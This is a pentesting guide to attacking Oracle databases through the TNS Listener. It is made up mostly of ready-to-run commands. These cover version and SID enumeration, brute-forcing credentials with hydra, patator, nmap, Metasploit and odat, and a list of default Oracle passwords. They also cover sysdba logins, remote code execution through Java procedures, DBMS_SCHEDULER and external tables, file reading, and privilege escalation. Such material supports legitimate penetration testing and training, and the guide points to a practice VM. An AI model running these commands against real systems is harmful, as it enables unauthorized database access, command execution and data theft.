1521,1522-1529 - Pentesting Oracle TNS Listener
Basic Information

Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from here).

When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP, -you may also get secondary listeners on 1522–1529-).

1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener

Summary

    Enumerate version info (search for known vulns)

    Bruteforce TNS listener communication (not always needed)

    Enumerate/Bruteforce SID names (like database names)

    Bruteforce credentials for valid SID name discovered

    Try to execute code 

In order to user MSF oracle modules you need to install some dependencies: Installation​
Enumeration

Tools that can be used for this are: nmap, MSF and tnscmd10g.
TNS listener version

nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>

Other useful TNS listener commands:

Command
	

Purpose

ping
	

Ping the listener

version
	

Provide output of the listener version and platform information

status
	

Return the current status and variables used by the listener

services
	

Dump service data

debug
	

Dump debugging information to the listener log

reload
	

Reload the listener configuration file

save_config
	

Write the listener configuration file to a backup location

stop
	

Invoke listener shutdown

If you receive an error, could be because TNS versions are incompatible (Use the --10G parameter with tnscmd10) and if the error persist, the listener may be password protected (you can see a list were all the errors are detailed here) — don't worry… hydra to the rescue:

hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener

The TNS listener could be vulnerable to MitM attacks. Check here how to check if the server is vulnerable and how to perform the attack (all versions up to version 12c are).
SID enumeration
What is a SID

The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.

In some old versions (in 9 it works) you could ask for the SID and the database send it to you:

tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
​
#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

If you cant access this way to the SIDs you will need to bruteforce them:

SID Bruteforce

I have merged the nmap and MSF sid lists into this one (without duplicates):
sids-oracle.txt
sids-oracle.txt - 5KB

hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids

In order to use oracle_login with patator you need to install:

pip3 install cx_Oracle --upgrade

Targeting Accounts

Got SID? Excellent, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.

Metasploit scanner/oracle/oracle_login It has a built-in dictionary for the most popular default values of user account information presented as login:password. By the way, such default entries represent one of the most popular and serious security problems in Oracle.

Nmap can also help here with the script oracle-brute. Note that this script mixes the logins and passwords, that is, it tries each login against every password, and it takes quite a while!
Default Passwords

Below are some of the default passwords associated with Oracle:

    DBSNMP/DBSNMP — Intelligent Agent uses this to talk to the db server (its some work to change it)

    SYS/CHANGE_ON_INSTALL — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!

    PCMS_SYS/PCMS_SYS — Default x account

    WMSYS/WMSYS — Default x account

    OUTLN/OUTLN — Default x account

    SCOTT/TIGER — Default x account

Other default passwords can be found here and here.

The versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable to offline brute force. Read more about this technique here.​
User/Pass bruteforce

Different tools offered different user/pass lists for oracle:

    oscan: /usr/share/oscanner/accounts.default (169 lines)

    MSF-1:  from admin/oracle/oracle_login  /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv (598 lines)

    MSF-2: from scanner/oracle/oracle_login  /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (568 lines)

    Nmap: /usr/share/nmap/nselib/data/oracle-default-accounts.lst (687 lines)

I have mixed all of them and removed duplicates:
users-oracle.txt
users-oracle.txt - 9KB
pass-oracle.txt
pass-oracle.txt - 9KB
​Brute Force​

Now, that you know a valid SID and valid credentials. To connect to the database you need the tool: sqlplus and to install it you need to follow some steps: 

​Installation​

To login using known credentials:

sqlplus <username>/<password>@<ip_address>/<SID>;

If the TNS Listener is on a non-default port (e.g. TCP/1522) :

sqlplus <username>/<password>@<ip_address>:<port>/<SID>;

If an account has system database priviledges (sysdba) or system operator (sysop) you may wish to try the following:

sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'

All in One

An interesting tool is oscanner, which will try to get some valid SID and then it will brute-force for valid credentials and try to extract some information:

#apt install oscanner
oscanner -s <IP> -P <PORT>

Another tool that will do all of this it odat:

git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID

With these options (-s and -p), ODAT will search valid SID (System ID) in a first step. You can configure some options for configuring methods (i.e. word-list or brute-force attack). By default, ODAT will use a big word list and it will do a small brute-force attack.

If ODAT founds at least one SID (e.g. ORCL), it will search valid Oracle accounts. It will do that on each SID found. You can specify some options for credentials (e.g. --accounts-file, --accounts-files, --login-as-pwd).

For each valid account (e.g. SYS) on each valid instance (SID), ODAT will return what each Oracle user can do (e.g. reverse shell, read files, become DBA).

​Wiki odat​
Remote Code Execution

There are at least two different ways to execute commands, such as by using Java procedures and DBMS_SCHEDULER package. By the way, you can also achieve RCE in case of SQL injection in a web application provided, of course, that the user running it has sufficient rights. At this stage, I highly recommend preparing the Oracle Database Attacking Tool: ODAT.
Install ODAT

git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali

Execute Code via Java Stored Procedure

./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND

​More details here​
Execute code via Scheduler

./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"

​More details here​
Execute code via External Tables

./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"

‘ODAT.py’ requires the privilege ‘CREATE ANY DIRECTORY’, which, by default, is granted only to DBA role, since it attempts to execute the file from any and not only “your” directory (the manual version of this attack requires less privileges).

​More details here.​
Read/Write files

./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"

​More details here​
Elevating Privileges

​More details here​

You can use the privesc module from odat to escalate privileges. In that link you can find several ways to escalate privileges using odat.

./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help

Vulnerability tested on oracle 10.1.0.3.0 – should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.

msf> use auxiliary/sqli/oracle/lt_findricset_cursor

Free Virtual Environment for testing

If you want to practice attacking Oracle databases, the safest way is to register for the Oracle Developer Days Virtualbox VM:
Developer Day - Hands-on Database Application Development
www.oracle.com

Most part of the information in this post was extracted from: https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573 and from https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/​

Other interesting references:

​http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html
